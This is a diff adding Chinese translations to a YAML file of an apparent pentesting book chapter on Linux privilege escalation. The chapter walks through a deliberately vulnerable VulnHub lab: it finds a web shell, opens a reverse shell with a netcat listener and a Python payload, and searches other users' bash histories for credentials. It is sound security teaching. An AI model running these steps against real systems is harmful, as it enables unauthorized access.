@@ -1,18 +1,25 @@
 - en: '11'
+  id: totrans-0
   prefs:
   - PREF_H1
   type: TYPE_NORMAL
+  zh: '11'
 - en: Privilege Escalation in the Bash Shell
+  id: totrans-1
   prefs:
   - PREF_H1
   type: TYPE_NORMAL
+  zh: Bash Shell中的特权提升
 - en: '**Privilege escalation** is a critical aspect of pentesting in Unix and Linux
     environments. This chapter explores the techniques and methodologies for identifying
     and exploiting vulnerabilities that allow an attacker to elevate their privileges
     within a system. We will focus on utilizing the Bash shell, a powerful tool present
     in most Unix-based systems, to execute various privilege escalation strategies.'
+  id: totrans-2
   prefs: []
   type: TYPE_NORMAL
+  zh: '**特权提升**是Unix和Linux环境中渗透测试的关键环节。本章探讨了识别和利用漏洞的技巧和方法，这些漏洞允许攻击者在系统中提升其权限。我们将重点介绍利用Bash
+    Shell这一大多数Unix系统中都存在的强大工具，来执行各种特权提升策略。'
 - en: Throughout this chapter, we will examine common **privilege escalation vectors**
     , develop Bash scripts for system enumeration, and analyze the exploitation of
     misconfigurations in services and scheduled tasks. Special attention will be given
@@ -20,241 +27,352 @@
     ( **SGID** ) binaries, which often provide opportunities for privilege escalation.
     By mastering these techniques, pentesters can effectively assess and improve the
     security posture of Unix and Linux systems.
+  id: totrans-3
   prefs: []
   type: TYPE_NORMAL
+  zh: 在本章中，我们将研究常见的**特权提升向量**，编写Bash脚本进行系统枚举，并分析服务和计划任务中的配置错误的利用。我们将特别关注理解和利用**设置用户ID**（**SUID**）和**设置组ID**（**SGID**）二进制文件，这些文件常常提供特权提升的机会。通过掌握这些技巧，渗透测试人员可以有效评估并提高Unix和Linux系统的安全态势。
 - en: We cover only the most common privilege escalation vectors in this chapter.
     For an extensive list and a link to download the LinPEAS tool to automate these
     checks, visit the HackTricks website’s Linux privilege escalation checklist at
     [https://book.hacktricks.xyz/linux-hardening/linux-privilege-escalation-checklist](https://book.hacktricks.xyz/linux-hardening/linux-privilege-escalation-checklist)
     .
+  id: totrans-4
   prefs: []
   type: TYPE_NORMAL
+  zh: 本章仅涵盖最常见的特权提升向量。欲了解更详细的列表并下载LinPEAS工具以自动执行这些检查，请访问HackTricks网站上的Linux特权提升检查表：[https://book.hacktricks.xyz/linux-hardening/linux-privilege-escalation-checklist](https://book.hacktricks.xyz/linux-hardening/linux-privilege-escalation-checklist)
+    。
 - en: Although the LinPEAS application will help find privilege escalation attack
     vectors for you, learning to do this manually will increasingly become more valuable
     as more Linux systems utilize some form of **Endpoint Detection and Response**
     ( **EDR** ) protection agent. These EDR agents may detect and block scripts such
     as LinPEAS, forcing you to run these checks manually.
+  id: totrans-5
   prefs: []
   type: TYPE_NORMAL
+  zh: 虽然LinPEAS应用程序可以帮助你找到特权提升攻击向量，但随着更多Linux系统使用某种形式的**端点检测与响应**（**EDR**）保护代理，学习手动执行这些操作将变得愈加重要。这些EDR代理可能会检测并阻止像LinPEAS这样的脚本，迫使你手动进行这些检查。
 - en: 'In this chapter, we’re going to cover the following main top ics:'
+  id: totrans-6
   prefs: []
   type: TYPE_NORMAL
+  zh: 在本章中，我们将涵盖以下主要主题：
 - en: Understanding privilege escalation in Unix/Linux systems
+  id: totrans-7
   prefs:
   - PREF_UL
   type: TYPE_NORMAL
+  zh: 理解Unix/Linux系统中的特权提升
 - en: Enumeration techniques for privilege escalation
+  id: totrans-8
   prefs:
   - PREF_UL
   type: TYPE_NORMAL
+  zh: 特权提升的枚举技巧
 - en: Exploiting SUID and SGID binaries with Bash
+  id: totrans-9
   prefs:
   - PREF_UL
   type: TYPE_NORMAL
+  zh: 利用SUID和SGID二进制文件进行Bash特权提升
 - en: Leveraging misconfigured services and scheduled tasks
+  id: totrans-10
   prefs:
   - PREF_UL
   type: TYPE_NORMAL
+  zh: 利用配置错误的服务和计划任务
 - en: Technical requirements
+  id: totrans-11
   prefs:
   - PREF_H1
   type: TYPE_NORMAL
+  zh: 技术要求
 - en: The code for this chapter can be found at [https://github.com/PacktPublishing/Bash-Shell-Scripting-for-Pentesters/tree/main/Chapter11](https://github.com/PacktPublishing/Bash-Shell-Scripting-for-Pentesters/tree/main/Chapter11)
     .
+  id: totrans-12
   prefs: []
   type: TYPE_NORMAL
+  zh: 本章的代码可以在以下链接找到：[https://github.com/PacktPublishing/Bash-Shell-Scripting-for-Pentesters/tree/main/Chapter11](https://github.com/PacktPublishing/Bash-Shell-Scripting-for-Pentesters/tree/main/Chapter11)
+    。
 - en: If you want to follow along with the exercises, you should have a Kali virtual
     machine available, and will need to download and run the **ESCALATE_LINUX** virtual
     machine from [https://www.vulnhub.com/entry/escalate_linux-1,323/](https://www.vulnhub.com/entry/escalate_linux-1,323/)
     . Ensure that both the Kali and **ESCALATE_LINUX** virtual machines have the same
     virtual network configuration.
+  id: totrans-13
   prefs: []
   type: TYPE_NORMAL
+  zh: 如果你想跟着练习，你应该有一台可用的Kali虚拟机，并且需要下载并运行**ESCALATE_LINUX**虚拟机，链接：[https://www.vulnhub.com/entry/escalate_linux-1,323/](https://www.vulnhub.com/entry/escalate_linux-1,323/)
+    。确保Kali和**ESCALATE_LINUX**虚拟机使用相同的虚拟网络配置。
 - en: 'Run the following command to install prerequisite tools in Kali:'
+  id: totrans-14
   prefs: []
   type: TYPE_NORMAL
+  zh: 运行以下命令以在Kali中安装所需工具：
 - en: '[PRE0]'
+  id: totrans-15
   prefs: []
   type: TYPE_PRE
+  zh: '[PRE0]'
 - en: Understanding privilege escalation in Unix/Linux systems
+  id: totrans-16
   prefs:
   - PREF_H1
   type: TYPE_NORMAL
+  zh: 理解Unix/Linux系统中的特权提升
 - en: Privilege escalation in Unix/Linux systems refers to the process of gaining
     higher-level access rights than those initially granted to a user or application.
     This concept is fundamental to system security and is a key focus for both system
     administrators and pentest ers.
+  id: totrans-17
   prefs: []
   type: TYPE_NORMAL
+  zh: Unix/Linux 系统中的权限提升是指获得比初始授予的用户或应用程序更高级别的访问权限的过程。这个概念是系统安全的基础，也是系统管理员和渗透测试人员的重点关注领域。
 - en: In Unix/Linux environments, the privilege system is primarily based on user
     and group permissions. The root user, with a user ID of **0** , has unrestricted
     access to the entire system. Regular users have limited permissions, typically
     confined to their home directories and specific system resources.
+  id: totrans-18
   prefs: []
   type: TYPE_NORMAL
+  zh: 在 Unix/Linux 环境中，权限系统主要基于用户和组权限。root 用户（用户 ID 为 **0**）具有对整个系统的无限制访问权限。普通用户的权限有限，通常仅限于他们的主目录和特定的系统资源。
 - en: 'Privilege escalation can be categorized into two main types:'
+  id: totrans-19
   prefs: []
   type: TYPE_NORMAL
+  zh: 权限提升可以分为两种主要类型：
 - en: '**Vertical privilege escalation** : This involves elevating privileges from
     a lower-level user to a higher-level user, often targeting root access. An example
     is a standard user gaining root privileges.'
+  id: totrans-20
   prefs:
   - PREF_UL
   type: TYPE_NORMAL
+  zh: '**垂直权限提升**：这涉及将权限从较低级别用户提升到更高级别用户，通常是针对 root 权限。例如，一个普通用户获取 root 权限。'
 - en: '**Horizontal privilege escalation** : This occurs when a user gains access
     to resources or performs actions that should be restricted to a different user
     of the same privilege level. An example is one standard user accessing another
     standard user’s files.'
+  id: totrans-21
   prefs:
   - PREF_UL
   type: TYPE_NORMAL
+  zh: '**水平权限提升**：当用户获得应该只限于同一权限级别的其他用户的资源访问或执行限制操作时，发生这种情况。例如，一个普通用户访问另一个普通用户的文件。'
 - en: 'Common paths for privilege escalation in Unix/Linux systems include the following:'
+  id: totrans-22
   prefs: []
   type: TYPE_NORMAL
+  zh: Unix/Linux 系统中的权限提升常见路径包括以下几种：
 - en: Exploiting vulnerabilities in system services or applications
+  id: totrans-23
   prefs:
   - PREF_UL
   type: TYPE_NORMAL
+  zh: 利用系统服务或应用程序中的漏洞
 - en: Misconfigurations in file or directory permissions
+  id: totrans-24
   prefs:
   - PREF_UL
   type: TYPE_NORMAL
+  zh: 文件或目录权限配置错误
 - en: Weak password policies or compromised credentials
+  id: totrans-25
   prefs:
   - PREF_UL
   type: TYPE_NORMAL
+  zh: 弱密码策略或被泄露的凭证
 - en: Kernel exploits
+  id: totrans-26
   prefs:
   - PREF_UL
   type: TYPE_NORMAL
+  zh: 内核漏洞
 - en: Unpatched software vulnerabilities
+  id: totrans-27
   prefs:
   - PREF_UL
   type: TYPE_NORMAL
+  zh: 未修补的软件漏洞
 - en: 'Before we get into the details of the common paths for privilege escalation,
     it is essential that we first review the Unix/Linux permission model. Understanding
     the **Unix/Linux permission model** is essential for grasping privilege escalation
     concepts:'
+  id: totrans-28
   prefs: []
   type: TYPE_NORMAL
+  zh: 在深入讨论权限提升的常见路径之前，首先需要回顾 Unix/Linux 的权限模型。理解 **Unix/Linux 权限模型** 对于掌握权限提升的概念至关重要：
 - en: File permissions are represented by read ( **r** ), write ( **w** ), and execute
     ( **x** ) flags for the owner, group, and others
+  id: totrans-29
   prefs:
   - PREF_UL
   type: TYPE_NORMAL
+  zh: 文件权限通过读取（**r**）、写入（**w**）和执行（**x**）标志来表示，适用于所有者、组和其他用户。
 - en: Special permissions such as **SUID** , **SGID** , and **Sticky Bit** can also
     impact privilege levels
+  id: totrans-30
   prefs:
   - PREF_UL
   type: TYPE_NORMAL
+  zh: 特殊权限如 **SUID**、**SGID** 和 **Sticky Bit** 也可能影响权限级别。
 - en: User and group management, including the **/etc/passwd** and **/etc/shadow**
     files, play a role in access control
+  id: totrans-31
   prefs:
   - PREF_UL
   type: TYPE_NORMAL
+  zh: 用户和组管理，包括 **/etc/passwd** 和 **/etc/shadow** 文件，在访问控制中起到作用
 - en: Privilege escalation techniques often involve a combination of information gathering,
     vulnerability identification, and exploitation. Attackers may chain multiple vulnerabilities
     or misconfigurations to gradually increase their access levels.
+  id: totrans-32
   prefs: []
   type: TYPE_NORMAL
+  zh: 权限提升技术通常涉及信息收集、漏洞识别和利用的结合。攻击者可能通过多重漏洞或配置错误的链式攻击，逐步增加其访问权限。
 - en: It’s important to note that privilege escalation is not inherently malicious.
     System administrators and security professionals use these techniques to identify
     and address security weaknesses. However, in the hands of malicious actors, privilege
     escalation can lead to unauthorized access, data breaches, and system compromise.
+  id: totrans-33
   prefs: []
   type: TYPE_NORMAL
+  zh: 需要注意的是，权限提升本身并非恶意。系统管理员和安全专家使用这些技术来识别和解决安全漏洞。然而，恶意行为者使用这些技巧时，权限提升可能导致未经授权的访问、数据泄露和系统泄漏。
 - en: 'Preventive measures against unintended privilege escalation include the following:'
+  id: totrans-34
   prefs: []
   type: TYPE_NORMAL
+  zh: 防止意外权限提升的预防措施包括：
 - en: Regular system updates and patch management
+  id: totrans-35
   prefs:
   - PREF_UL
   type: TYPE_NORMAL
+  zh: 定期的系统更新和补丁管理
 - en: Proper configuration of file and directory permissions
+  id: totrans-36
   prefs:
   - PREF_UL
   type: TYPE_NORMAL
+  zh: 文件和目录权限的正确配置
 - en: Implementation of the principle of least privilege
+  id: totrans-37
   prefs:
   - PREF_UL
   type: TYPE_NORMAL
+  zh: 实施最小权限原则
 - en: Use of **security-enhanced Linux** ( **SELinux** ) or **AppArmor**
+  id: totrans-38
   prefs:
   - PREF_UL
   type: TYPE_NORMAL
+  zh: 使用 **安全增强的 Linux**（**SELinux**）或 **AppArmor**
 - en: Regular security audits and vulnerability assessments
+  id: totrans-39
   prefs:
   - PREF_UL
   type: TYPE_NORMAL
+  zh: 定期的安全审计和漏洞评估
 - en: Understanding privilege escalation is critical for both defending against and
     conducting pentests on Unix/Linux systems. It forms the foundation for more advanced
     techniques and exploits that will be explored in subsequent sections of this chapter.
+  id: totrans-40
   prefs: []
   type: TYPE_NORMAL
+  zh: 理解权限提升对防御和进行Unix/Linux系统渗透测试至关重要。这为本章后续部分将探讨的更高级技巧和漏洞利用奠定了基础。
 - en: The next section will explore how to perform enumeration.
+  id: totrans-41
   prefs: []
   type: TYPE_NORMAL
+  zh: 下一部分将探讨如何执行枚举。
 - en: Enumeration techniques for privilege escalation
+  id: totrans-42
   prefs:
   - PREF_H1
   type: TYPE_NORMAL
+  zh: 权限提升的枚举技巧
 - en: '**Enumeration** is a key phase in privilege escalation, allowing pentesters
     to gather information about the target system. This section focuses on Bash commands
     and techniques for effective system enumeration for privilege escalation.'
+  id: totrans-43
   prefs: []
   type: TYPE_NORMAL
+  zh: '**枚举**是权限提升的关键阶段，它允许渗透测试人员收集有关目标系统的信息。本节重点介绍Bash命令和技巧，以有效进行系统枚举来实现权限提升。'
 - en: Initial access
+  id: totrans-44
   prefs:
   - PREF_H2
   type: TYPE_NORMAL
+  zh: 初始访问
 - en: This section will precede privilege escalation. It covers connecting to the
     **ESCALATE_LINUX** virtual machine, which we’ll call the *target* for the remainder
     of this chapter. Once we have established a working shell, we’ll move forward
     into subsequent sections.
+  id: totrans-45
   prefs: []
   type: TYPE_NORMAL
+  zh: 本节将先于权限提升部分进行。它涵盖了如何连接到**ESCALATE_LINUX**虚拟机，我们将在本章其余部分中称之为*目标*。一旦建立了有效的shell连接，我们将进入后续部分。
 - en: In this exercise, I have both the Kali and the target running in VirtualBox
     virtual machines. Both Kali and **ESCALATE_LINUX** offer virtual machine OVA files
     that can be downloaded and imported into VirtualBox.
+  id: totrans-46
   prefs: []
   type: TYPE_NORMAL
+  zh: 在这个练习中，我同时在VirtualBox虚拟机中运行Kali和目标系统。Kali和**ESCALATE_LINUX**都提供了可以下载并导入到VirtualBox中的虚拟机OVA文件。
 - en: 'The network interfaces are configured to use the host-only network adapter,
     as shown in the following figure:'
+  id: totrans-47
   prefs: []
   type: TYPE_NORMAL
+  zh: 网络接口配置为使用仅主机网络适配器，如下图所示：
 - en: '![Figure 11.1 – The virtual network interface configuration](image/B22229_11_01.jpg)'
+  id: totrans-48
   prefs: []
   type: TYPE_IMG
+  zh: '![图11.1 – 虚拟网络接口配置](image/B22229_11_01.jpg)'
 - en: Figure 11.1 – The virtual network interface configuration
+  id: totrans-49
   prefs: []
   type: TYPE_NORMAL
+  zh: 图11.1 – 虚拟网络接口配置
 - en: 'The Kali virtual machine should have an additional virtual network interface
     added. Of the two Kali virtual network interfaces, one should be in **Host-only**
     mode, and the other should be in **Bridged** mode, as shown in the following screenshot:'
+  id: totrans-50
   prefs: []
   type: TYPE_NORMAL
+  zh: Kali虚拟机应添加一个额外的虚拟网络接口。在两个Kali虚拟网络接口中，一个应该处于**仅主机**模式，另一个应该处于**桥接**模式，如下图所示：
 - en: '![Figure 11.2 – The Kali VirtualBox network interface configuration](image/B22229_11_02.jpg)'
+  id: totrans-51
   prefs: []
   type: TYPE_IMG
+  zh: '![图11.2 – Kali VirtualBox 网络接口配置](image/B22229_11_02.jpg)'
 - en: Figure 11.2 – The Kali VirtualBox network interface configuration
+  id: totrans-52
   prefs: []
   type: TYPE_NORMAL
+  zh: 图11.2 – Kali VirtualBox 网络接口配置
 - en: This configuration will keep the vulnerable target system isolated from the
     network while allowing the Kali system to connect to the internet to download
     any needed tools.
+  id: totrans-53
   prefs: []
   type: TYPE_NORMAL
+  zh: 此配置将使脆弱的目标系统与网络隔离，同时允许Kali系统连接到互联网以下载所需的工具。
 - en: 'If you have any trouble identifying which of Kali’s network interfaces are
     connected to each network mode, the command output shown in the following figure
     should help you figure this out:'
+  id: totrans-54
   prefs: []
   type: TYPE_NORMAL
+  zh: 如果你在识别Kali的哪个网络接口连接到每个网络模式时遇到困难，下面图示的命令输出应该能帮助你解决这个问题：
 - en: '![Figure 11.3 – Enumerating virtual network interfaces](image/B22229_11_03.jpg)'
+  id: totrans-55
   prefs: []
   type: TYPE_IMG
+  zh: '![图11.3 – 枚举虚拟网络接口](image/B22229_11_03.jpg)'
 - en: Figure 11.3 – Enumerating virtual network interfaces
+  id: totrans-56
   prefs: []
   type: TYPE_NORMAL
+  zh: 图11.3 – 枚举虚拟网络接口
 - en: The Kali VirtualBox virtual machine downloaded from Offensive Security ( [https://cdimage.kali.org/kali-2024.2/kali-linux-2024.2-virtualbox-amd64.7z](https://cdimage.kali.org/kali-2024.2/kali-linux-2024.2-virtualbox-amd64.7z)
     ) already has the guest extensions installed, which will allow you to query the
     network interfaces to find their IP addresses. In the preceding figure, the first
@@ -262,8 +380,10 @@
     as is the target system. Unfortunately, the target system doesn’t have VirtualBox
     guest extensions installed; therefore, we cannot query for its IP address information
     and will have to rely on Kali.
+  id: totrans-57
   prefs: []
   type: TYPE_NORMAL
+  zh: 从Offensive Security下载的Kali VirtualBox虚拟机（[https://cdimage.kali.org/kali-2024.2/kali-linux-2024.2-virtualbox-amd64.7z](https://cdimage.kali.org/kali-2024.2/kali-linux-2024.2-virtualbox-amd64.7z)）已经安装了来宾扩展，这将允许你查询网络接口并获取其IP地址。在前图中，第一个**网络接口卡**（**NIC**）配置为**仅主机**访问模式，目标系统也是如此。不幸的是，目标系统没有安装VirtualBox来宾扩展；因此，我们无法查询其IP地址信息，只能依赖Kali。
 - en: 'Moreover, the second and third commands in the preceding figure differ only
     in the number of the virtual interface. **NI C 1** corresponds to **/VirtualBox/GuestInfo/Net/0/V4/IP**
     , and **NIC 2** corresponds to **/VirtualBox/GuestInfo/Net/1/V4/IP** . Since **NIC
@@ -271,63 +391,101 @@
     , we can guess that the target system is also found on this network. Next, let’s
     scan that network to find an IP address with TCP port **80** (HTTP) listening,
     as shown here:'
+  id: totrans-58
   prefs: []
   type: TYPE_NORMAL
+  zh: 此外，前述图中的第二个和第三个命令仅在虚拟接口的编号上有所不同。**NIC 1** 对应 **/VirtualBox/GuestInfo/Net/0/V4/IP**
+    ，而 **NIC 2** 对应 **/VirtualBox/GuestInfo/Net/1/V4/IP** 。由于 **NIC 1** 配置为 **Host-only**
+    并且其 IP 地址为 **192.168.56.101** ，我们可以推测目标系统也位于此网络中。接下来，让我们扫描该网络，寻找监听 TCP 端口 **80**（HTTP）的
+    IP 地址，如下所示：
 - en: '![Figure 11.4 – Scanning the network to locate HTTP servers](image/B22229_11_04.jpg)'
+  id: totrans-59
   prefs: []
   type: TYPE_IMG
+  zh: '![图 11.4 – 扫描网络以定位 HTTP 服务器](image/B22229_11_04.jpg)'
 - en: Figure 11.4 – Scanning the network to locate HTTP servers
+  id: totrans-60
   prefs: []
   type: TYPE_NORMAL
+  zh: 图 11.4 – 扫描网络以定位 HTTP 服务器
 - en: 'If we visit that address in our web browser, we find an Apache2 default page,
     as shown:'
+  id: totrans-61
   prefs: []
   type: TYPE_NORMAL
+  zh: 如果我们在网页浏览器中访问该地址，我们会看到一个 Apache2 默认页面，如下所示：
 - en: '![Figure 11.5 – A default Apache2 page](image/B22229_11_05.jpg)'
+  id: totrans-62
   prefs: []
   type: TYPE_IMG
+  zh: '![图 11.5 – 默认的 Apache2 页面](image/B22229_11_05.jpg)'
 - en: Figure 11.5 – A default Apache2 page
+  id: totrans-63
   prefs: []
   type: TYPE_NORMAL
+  zh: 图 11.5 – 默认的 Apache2 页面
 - en: 'Since we’ve found only a default website, we need to check for additional web
     content. Run the following **dirsearch** command:'
+  id: totrans-64
   prefs: []
   type: TYPE_NORMAL
+  zh: 由于我们仅找到一个默认的网站，我们需要检查是否有其他的 Web 内容。运行以下 **dirsearch** 命令：
 - en: '[PRE1]'
+  id: totrans-65
   prefs: []
   type: TYPE_PRE
+  zh: '[PRE1]'
 - en: 'The output reveals **shell.php** , as shown in the following figure:'
+  id: totrans-66
   prefs: []
   type: TYPE_NORMAL
+  zh: 输出显示 **shell.php** ，如下图所示：
 - en: '![Figure 11.6 – A valid PHP web page is located](image/B22229_11_06.jpg)'
+  id: totrans-67
   prefs: []
   type: TYPE_IMG
+  zh: '![图 11.6 – 找到了有效的 PHP 网页](image/B22229_11_06.jpg)'
 - en: Figure 11.6 – A valid PHP web page is located
+  id: totrans-68
   prefs: []
   type: TYPE_NORMAL
+  zh: 图 11.6 – 找到了有效的 PHP 网页
 - en: 'If we visit [https://192.168.56.102/shell.php](https://192.168.56.102/shell.php)
     in a web browser on Kali, we see the following text on the web page: **/*pass
     cmd as** **get parameter*/** .'
+  id: totrans-69
   prefs: []
   type: TYPE_NORMAL
+  zh: 如果我们在 Kali 上的网页浏览器中访问 [https://192.168.56.102/shell.php](https://192.168.56.102/shell.php)，我们会看到网页上显示以下文本：
+    **/*pass cmd as** **get parameter*/** 。
 - en: This is a huge hint that we won’t ordinarily get, so keep in mind that we’ve
     been given a shortcut to finding the vulnerability so that we can spend our precious
     time focusing on privilege escalation, which is what the target was intended for.
+  id: totrans-70
   prefs: []
   type: TYPE_NORMAL
+  zh: 这是一个我们通常不会得到的巨大线索，因此请记住，我们已经获得了一个查找漏洞的捷径，这样我们就可以将宝贵的时间集中在特权升级上，这是目标系统的意图所在。
 - en: 'The following figure shows how to properly exploit this web page:'
+  id: totrans-71
   prefs: []
   type: TYPE_NORMAL
+  zh: 接下来的图示展示了如何正确利用这个网页：
 - en: '![Figure 11.7 – An exploit proof-of-concept for the web shell](image/B22229_11_07.jpg)'
+  id: totrans-72
   prefs: []
   type: TYPE_IMG
+  zh: '![图 11.7 – Web shell 漏洞利用概念验证](image/B22229_11_07.jpg)'
 - en: Figure 11.7 – An exploit proof-of-concept for the web shell
+  id: totrans-73
   prefs: []
   type: TYPE_NORMAL
+  zh: 图 11.7 – Web shell 漏洞利用概念验证
 - en: Next, we need to get a shell on the target system. In your Kali terminal, enter
     **nc -nlvp 4444** and press the *Enter* key.
+  id: totrans-74
   prefs: []
   type: TYPE_NORMAL
+  zh: 接下来，我们需要在目标系统上获得一个 shell。在你的 Kali 终端中，输入 **nc -nlvp 4444** 并按下 *Enter* 键。
 - en: Visit the *Reverse Shell Cheat Sheet* at [https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
     . We’re going to use the Python version. Copy the code for the Python shell, then
     visit the CyberChef website at https://gchq.github.io/CyberChef/#recipe=URL_Encode(true)
@@ -335,101 +493,155 @@
     be executed from **/bin/sh** to **/bin/bash** . Change the IP address and port
     to match what you’re using on your Kali system. For the port, you can use **4444**
     . Click the **Copy** button in the **Output** pane.
+  id: totrans-75
   prefs: []
   type: TYPE_NORMAL
+  zh: 访问 *Reverse Shell Cheat Sheet* [https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
+    。我们将使用 Python 版本。复制 Python shell 代码，然后访问 CyberChef 网站 [https://gchq.github.io/CyberChef/#recipe=URL_Encode(true)](https://gchq.github.io/CyberChef/#recipe=URL_Encode(true))，并将
+    Python 代码粘贴到 **Input** 面板中。将要执行的 Python 命令从 **/bin/sh** 更改为 **/bin/bash** 。将 IP
+    地址和端口更改为与你在 Kali 系统上使用的相匹配。对于端口，你可以使用 **4444** 。点击 **Output** 面板中的 **Copy** 按钮。
 - en: 'In your web browser where you have the target **shell.php** , paste in the
     Python code after **cmd=** , as shown in the following figure, then press the
     *Enter* key:'
+  id: totrans-76
   prefs: []
   type: TYPE_NORMAL
+  zh: 在你的网页浏览器中打开目标 **shell.php** ，然后将 Python 代码粘贴到 **cmd=** 后面，如下图所示，接着按下 *Enter*
+    键：
 - en: '![Figure 11.8 – Executing the Python payload in the web shell](image/B22229_11_08.jpg)'
+  id: totrans-77
   prefs: []
   type: TYPE_IMG
+  zh: '![图 11.8 – 在 Web shell 中执行 Python 载荷](image/B22229_11_08.jpg)'
 - en: Figure 11.8 – Executing the Python payload in the web shell
+  id: totrans-78
   prefs: []
   type: TYPE_NORMAL
+  zh: 图 11.8 – 在 Web shell 中执行 Python 载荷
 - en: 'In your Kali terminal, you should see that you have a reverse shell connection,
     as shown here:'
+  id: totrans-79
   prefs: []
   type: TYPE_NORMAL
+  zh: 在你的 Kali 终端中，你应该会看到一个反向 shell 连接，如下所示：
 - en: '![Figure 11.9 – A reverse shell from the target system](image/B22229_11_09.jpg)'
+  id: totrans-80
   prefs: []
   type: TYPE_IMG
+  zh: '![图 11.9 – 来自目标系统的反向 shell](image/B22229_11_09.jpg)'
 - en: Figure 11.9 – A reverse shell from the target system
+  id: totrans-81
   prefs: []
   type: TYPE_NORMAL
+  zh: 图 11.9 – 来自目标系统的反向 shell
 - en: Now that we have established our session, let’s move forward and start exploring
     the target in the next section.
+  id: totrans-82
   prefs: []
   type: TYPE_NORMAL
+  zh: 现在我们已经建立了会话，让我们继续并开始在下一节中探索目标。
 - en: System information gathering
+  id: totrans-83
   prefs:
   - PREF_H2
   type: TYPE_NORMAL
+  zh: 系统信息收集
 - en: 'The first thing I want to know once I have a shell on a Linux system is whether
     I can run any commands using **sudo** . Enter the following command to check your
     **sudo** permissions:'
+  id: totrans-84
   prefs: []
   type: TYPE_NORMAL
+  zh: 一旦我在 Linux 系统上获得了一个 shell，首先想知道的是我是否可以使用**sudo**运行任何命令。输入以下命令来检查你的**sudo**权限：
 - en: '[PRE2]'
+  id: totrans-85
   prefs: []
   type: TYPE_PRE
+  zh: '[PRE2]'
 - en: Unfortunately, we’re prompted for a password on the target system. Since we
     don’t know the password for this user account, this is a dead-end. If we did know
     the password, we could enter it, and if we’re lucky, the command output would
     show that we could run a command with **sudo** and possibly abuse it to escalate
     privileges.
+  id: totrans-86
   prefs: []
   type: TYPE_NORMAL
+  zh: 不幸的是，我们在目标系统上被要求输入密码。由于我们不知道此用户帐户的密码，因此这是一条死胡同。如果我们知道密码，我们可以输入它，并且如果运气好的话，命令输出可能会显示我们可以使用**sudo**运行某个命令，并可能利用它提升权限。
 - en: Tip
+  id: totrans-87
   prefs: []
   type: TYPE_NORMAL
+  zh: 提示
 - en: If you enter the **sudo -l** command and get any output that shows you can run
     anything using **sudo** , search for the command on the *GTFOBins* website ( [https://gtfobins.github.io](https://gtfobins.github.io)
     ) to see whether you can abuse it for privilege escalation.
+  id: totrans-88
   prefs: []
   type: TYPE_NORMAL
+  zh: 如果你输入**sudo -l**命令并得到任何输出，表明你可以使用**sudo**运行任何命令，请在*GTFOBins*网站（[https://gtfobins.github.io](https://gtfobins.github.io)）上搜索该命令，查看是否可以滥用它进行权限提升。
 - en: 'Let’s take a look around in the current directory, **/var/www/html** . We check
     to see whether the files in this directory contain any credentials. However, we
     are not in luck, as shown in the following figure:'
+  id: totrans-89
   prefs: []
   type: TYPE_NORMAL
+  zh: 让我们在当前目录**/var/www/html**中看看。我们检查该目录中的文件是否包含任何凭据。然而，如下图所示，我们并没有运气：
 - en: '![Figure 11.10 – Examining files in the current working directory](image/B22229_11_10.jpg)'
+  id: totrans-90
   prefs: []
   type: TYPE_IMG
+  zh: '![图 11.10 – 检查当前工作目录中的文件](image/B22229_11_10.jpg)'
 - en: Figure 11.10 – Examining files in the current working directory
+  id: totrans-91
   prefs: []
   type: TYPE_NORMAL
+  zh: 图 11.10 – 检查当前工作目录中的文件
 - en: 'Next, we take a look around in our home directory. Use the **cat** command
     to examine any previous commands this user has previously entered using the following
     command:'
+  id: totrans-92
   prefs: []
   type: TYPE_NORMAL
+  zh: 接下来，我们查看一下我们的主目录。使用**cat**命令检查此用户之前输入的任何命令，使用以下命令：
 - en: '[PRE3]'
+  id: totrans-93
   prefs: []
   type: TYPE_PRE
+  zh: '[PRE3]'
 - en: 'While looking in our home directory, we do find an interesting bit of information,
     as seen here:'
+  id: totrans-94
   prefs: []
   type: TYPE_NORMAL
+  zh: 在查看我们的主目录时，确实发现了一些有趣的信息，如下所示：
 - en: '![Figure 11.11 – A file that indicates this user has sudo rights](image/B22229_11_11.jpg)'
+  id: totrans-95
   prefs: []
   type: TYPE_IMG
+  zh: '![图 11.11 – 表示此用户具有 sudo 权限的文件](image/B22229_11_11.jpg)'
 - en: Figure 11.11 – A file that indicates this user has sudo rights
+  id: totrans-96
   prefs: []
   type: TYPE_NORMAL
+  zh: 图 11.11 – 表示此用户具有 sudo 权限的文件
 - en: The highlighted file indicates that this user has run the **sudo** command in
     the past. Without knowing the user’s password, we cannot hope to run **sudo -l**
     to find out what they can run using **sudo** .
+  id: totrans-97
   prefs: []
   type: TYPE_NORMAL
+  zh: 突出的文件表明此用户曾经运行过**sudo**命令。由于不知道用户的密码，我们无法运行**sudo -l**来查明他们可以用**sudo**运行什么命令。
 - en: 'Can we view any other user’s **.bash_history** file? Enter the following command
     to check this:'
+  id: totrans-98
   prefs: []
   type: TYPE_NORMAL
+  zh: 我们能否查看其他用户的**.bash_history**文件？输入以下命令来检查：
 - en: '[PRE4]'
+  id: totrans-99
   prefs: []
   type: TYPE_PRE
+  zh: '[PRE4]'
 - en: The preceding command runs the **find** command on the **/home** directory,
     looking for a filename ( **-name** ) of **.bash_history** . Errors ( **file descriptor
     2** ) are sent to **/dev/null** , which results in them being discarded. Any files
@@ -441,172 +653,262 @@
     can often be useful once we have more information. Since we have some level of
     access to various users’ home directories, make sure you take the time to explore
     these directories for any files containing useful information.
+  id: totrans-100
   prefs: []
   type: TYPE_NORMAL
+  zh: 前面的命令在**/home**目录上运行**find**命令，查找文件名（**-name**）为**.bash_history**的文件。错误（**文件描述符
+    2**）被发送到**/dev/null**，从而被丢弃。任何与此模式匹配的文件都会打印到屏幕上（**-exec cat {} +**）。我们得到的输出比查看当前用户的**.bash_history**文件时要多得多，但在命令行参数的输出中没有找到任何凭证。然而，值得回头检查每个用户的**.bash_history**文件，并记录下谁运行了什么命令。一旦我们获得更多的信息，这些信息通常会很有用。由于我们可以访问多个用户的家目录，请务必花时间探索这些目录，寻找任何包含有用信息的文件。
 - en: 'Next, let’s take a look at the system architecture and look for kernel exploits.
     Understanding the system’s architecture, kernel version, and distribution helps
     identify potential vulnerabilities. The following command prints this information:'
+  id: totrans-101
   prefs: []
   type: TYPE_NORMAL
+  zh: 接下来，让我们看看系统架构，并寻找内核漏洞。了解系统的架构、内核版本和发行版有助于识别潜在的漏洞。以下命令打印该信息：
 - en: '[PRE5]'
+  id: totrans-102
